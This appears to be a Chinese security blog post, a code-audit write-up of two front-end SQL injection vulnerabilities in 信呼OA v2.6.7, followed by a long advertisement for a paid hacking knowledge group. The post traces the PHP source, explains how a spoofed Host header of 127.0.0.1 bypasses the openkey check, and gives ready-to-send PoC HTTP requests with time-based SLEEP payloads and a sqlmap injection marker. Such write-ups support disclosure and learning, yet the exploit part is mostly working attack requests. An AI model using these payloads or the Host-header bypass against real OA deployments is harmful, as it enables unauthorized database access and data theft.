#  【漏洞】PHP代码审计篇 - 信呼OA 前台分析SQL注入  
CrayonXiaoxin  神农Sec   2025-06-08 01:01  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
文章作者：  
CrayonXiaoxin  
  
文章来源：https://xz.aliyun.com/news/18185  
  
  
  
**信呼OA v2.6.7 SQL注入漏洞**  
  
  
  
## 系统介绍  
  
```
信呼，免费开源的办公OA系统，包括APP，pc上客户端，REIM即时通信，服务端等，让每个企业单位都有自己的办公系统。
```  
  
官网：  
http://www.rockoa.com  
  
  
路由分析  
  
  
抓一个登录请求包分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGBgo3ttia7VViaoelgRqYoZxibwdial8KB8OWLGMIFr31wbYrfpx8uJvpeQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
其中a是方法 m是目录 如果有多层目录则 d是最外层目录  m由 文件名|目录 组成  
  
## 漏洞点一 （存在 ip限制）  
  
### 源码分析  
  
  
在文件中分析代码找到webmain/task/openapi/opendkqAction.php的  
  
addkqjs方法 调用了insert方法   
  
```
private function addkqjs($sn)  {      $uarr = array(         'pinpai'=> '1',         'num'=> $sn,         'name'=> $sn,         'comid' => '1',         'optdt' => $this->now      );      $uarr['id'] = m('kqjsn')->insert($uarr);      return $uarr;  }
```  
  
一步步跟进去查看insert方法  确认传入的值被带入到sql语句中执行了sql  
  
```
public function insert($arr)  {      $nid = 0;      if($this->record($arr, ''))$nid = $this->db->insert_id();      return $nid;  } // include/class/mysql.phppublic function record($arr, $where='')  {      return $this->db->record($this->table, $arr, $where);  }public function record($table,$array,$where='')  {      $addbool   = true;      if(!$this->isempt($where))$addbool=false;      $cont     = '';      if(is_array($array)){         foreach($array as $key=>$val){            $cont.=",`$key`=".$this->toaddval($val)."";         }         $cont  = substr($cont,1);      }else{         $cont  = $array;      }      $table = $this->gettables($table);      if($addbool){         $sql="insert into $table set $cont";      }else{         $where = $this->getwhere($where);         $sql="update $table set $cont where $where";      }      return $this->tranbegin($sql);  }private function tranbegin($sql)  {      //if($this->errorbool)return false;      if($this->conn == null)$this->connect();      $this->iudcount++;      if(!$this->tran){         //$this->starttran();         //$this->tran=true;    }      $rsa   = $this->query($sql);      $this->iudarr[]=$rsa;      if(!$rsa)$this->errorbool = true;      return $rsa;  }
```  
  
接下来就往上看哪里调用addkqjs方法传值 $sn  在同文件内 找到了senddata 调用了这个方法    
  
```
private function senddata($type)  {      $str = $this->postdata;      if(isempt($str))$this->showreturn('', 'not data', 201);      $arr   = json_decode($str, true);      $oi    = 0;$uarr = array();$finarr = array();      $dtobj     = c('date');$adb   = m('admin');$db = m('kqdkjl');$uobj = m('userinfo');      $updt  = '';      $cheobj = c('check');      $snarr     = array();      if($type==9){         $snarr = $this->db->getarr('[Q]kqjsn','`pinpai`=1','`id`,`name`','num');      }      $datype = array('密码','指纹','刷卡');      if(is_array($arr))foreach($arr as $k=>$rs){         $name = isset($rs['name']) ? $rs['name'] : '';         $dkdt = isset($rs['dkdt']) ? $rs['dkdt'] : '';         $finge= isset($rs['finge']) ? $rs['finge'] : '';         $name = str_replace("'",'', $name);         $uid  = 0;         $snid = 0;         $sntype = 1;         $comid = 0;         $explain = '';         if($type==9){            $sn      = arrvalue($rs, 'sn');            if(!$sn)continue;            $snrs = arrvalue($snarr, $sn);            if(!$snrs){               $snrs = $this->addkqjs($sn);               $snarr[$sn] = $snrs;            }
```  
  
继续分析代码$sn 由arrvalue方法取自传入的第一参数的 一个key为sn的valen值  
  
```
$sn      = arrvalue($rs, 'sn');  function arrvalue($arr, $k, $dev='')  {      $val  = $dev;      if(isset($arr[$k]))$val= $arr[$k];      return $val;  }
```  
  
继续分析代码 得知想要执行到这里 需要$type 等于9  
  
且  $rs 来自于 $arr 的value    然后  $arr 又来自于 json解码后的 $str   $str来自于 传入的post请求体  是可控的    
  
  
最后查找调用 senddata 被  同文件下的  zktimeAction 调用 同时也传入了9 满足上面的 $type =9    
  
```
public function zktimeAction()  {      //9中控      $carr  = $this->senddata(9);      echo $carr['updt'];  }
```  
  
继续看代码发现 这个类的父类中存在一个鉴权  但是分析代码可知 Host 是127.0.0.1 或 192.168.x.x 的范围就可以绕过验证 。  
  
```
public function initAction()  {      $this->display= false;      $openkey      = $this->post('openkey');      $this->openkey     = getconfig('openkey');      if($this->keycheck && HOST != '127.0.0.1' && !contain(HOST,'192.168') && $this->openkey != ''){         if($openkey != md5($this->openkey))$this->showreturn('', 'openkey not access', 201);      }      $this->getpostdata();  }
```  
  
按照路由构造请求url  
  
  
/index.php?m=opendkq|openapi&d=task&a=zktime  
  
  
按照sn的取值 构造两层json  
  
  
{"cn":{"sn":"123"}}  
  
  
host 为127.0.0.1  
  
### 漏洞利用  
  
#### poc  
  
```
POST /index.php?m=opendkq|openapi&d=task&a=zktime HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=p4idg1a6f9b059t7laum6m333o; deviceid=1733809734848Connection: closeContent-Length: 34Content-Type: application/x-www-form-urlencoded{"cn":{"sn":"123' and sleep(3)#"}}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGOr0xiaBSeDhq72TyQMIBudajAVibfuluibIJ97T1RYibAef3mlia1ZkCgMA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwG2KicCOm2TcDNjOVmdCyr5Wtw9BAiaQdBVtSCANnyBicuBFIG0iaI5v9zRA/640?wx_fmt=png&from=appmsg "")  
  
#### sqlmap  
  
  
sqlmap  结合burp  修改host  
  
```
POST /index.php?m=opendkq|openapi&d=task&a=zktime HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=p4idg1a6f9b059t7laum6m333o; deviceid=1733809734848Connection: closeContent-Length: 34Content-Type: application/x-www-form-urlencoded{"cn":{"sn":"123'*"}}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGPiayECYjaicmuk6CqkrsDqxxOtj6ywafF41rN3RkwalMEaKkFSfbibCzw/640?wx_fmt=png&from=appmsg "")  
  
  
  
## 漏洞点二 （存在 ip限制）  
  
### 源码分析  
  
  
webmain/task/openapi/openbaseAction.php  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGXXTPhYIsYSOVTgxyia9tcAl1r0wtQS8bjziapVk5Vw0kOcRtYsZdmFPA/640?wx_fmt=png&from=appmsg "")  
  
  
看getpostarr()方法可以分析出 传入的post值需要为json格式  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGSm8HYNYbFOW2zZjs8oYI0Wibib2YzhoHKRK9SSlHmoFvTatrIfx9WlIg/640?wx_fmt=png&from=appmsg "")  
  
  
  
继续分析下面的代码传入的参数basemodenum 赋值给了 $modenum   baseoptid参数 赋值给了 $adminid  但是经过了过滤 无法传入单引号等内容  
  
  
在21行代码中调用getuserid方法对 $adminid 参数进行了查询  并且在22行代码可以得知 需要让21行的查询获得数据 不然会直接报错终止  
  
  
根据查看sql语句可以得知 查询的内容在admin表中  分析可知 最简单方法的就是传入一个1 即可  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwG9JXMjQqrOricVw7RImSfYhSdpjx5fC1VOrvJj8T5KtHBVUbrNiakkkrw/640?wx_fmt=png&from=appmsg "")  
  
  
继续分析代码 查看querydata方法获得了三个参数做了什么操作  看代码发现 在方法中将传入的 $modenum 也就是 $num 传入了initflow方法中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGIWLaTUtEYF5NZ6iaHty5aaEMIxlObxOqTBNeKAQaicCRDGeeboAOhnNA/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGKVOXeGcUrI85QYHpBN4tkQ3fSxs6G2DgRRAB0AYMuVIJDdiaVwtV6iag/640?wx_fmt=png&from=appmsg "")  
  
  
继续跟进initflow方法 发现又被传入了initdata 方法中   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGaSoLghEI4SibPycCIkYRDuxtDLnVTrE6zZ3VroHUvs1TRFACc36nnMw/640?wx_fmt=png&from=appmsg "")  
  
  
在这里 $num 的值被添加到了sql的一个条件语句中被执行 其中无任何限制 这样我们就可以开始构造poc 进行利用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwG6mVOB3icLA3s44ltqWjHPvlficZ2MCfTqHPUOa0icEkEqSoib4I1y4R1Jw/640?wx_fmt=png&from=appmsg "")  
  
  
### 漏洞利用  
  
#### poc  
  
```
POST /index.php?m=openbase%7Copenapi&d=task&a=querydata HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 58Cookie: {"baseoptid":"1","basemodenum":"a123456' OR SLEEP(0.01)#"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwGhM5YC5LJkzS1IVUKCmywKPp9D2mOmFWYykiajrgaCWsicVrtcXcm3crQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX4v9F2NPPB61D4zzTw2KwG65PZ1MsRfRFvCA4YlJicFBhK7W5r2CjTuXNNrMMgdTIDF8sHy9WbReQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于800人 45元/年  
  
星球人数少于1000人 60元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXzvZ0y3QsSdvjianiaUxkjEaXSFO2TpWyrTMI7X3ZRl00kSsoAuY8eXcSA/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满800人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWV3tDTbzdQK4qCdxgHkSbgibaLP4ChjjO3BIeMgdTz3YelibqGvekSLXV3s1JpWkncKqYgbfZvOLENg/640?wx_fmt=jpeg&from=appmsg "")  
  
    
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
